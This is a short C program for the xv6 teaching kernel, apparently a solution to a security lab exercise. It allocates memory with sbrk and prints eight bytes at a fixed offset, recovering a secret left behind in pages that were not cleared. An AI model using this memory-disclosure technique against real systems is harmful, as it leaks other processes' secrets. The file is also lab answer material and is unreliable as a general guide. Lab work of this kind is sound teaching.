#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)
  char *end = sbrk(PGSIZE * 32);

  if (end == (char*)-1) {
     fprintf(2, "attack: sbrk failed\n");
     exit(1);
  }

  end = end + 16 * PGSIZE;
  char *secret = end + 32;
  write(2, secret, 8);
  exit(1);
}
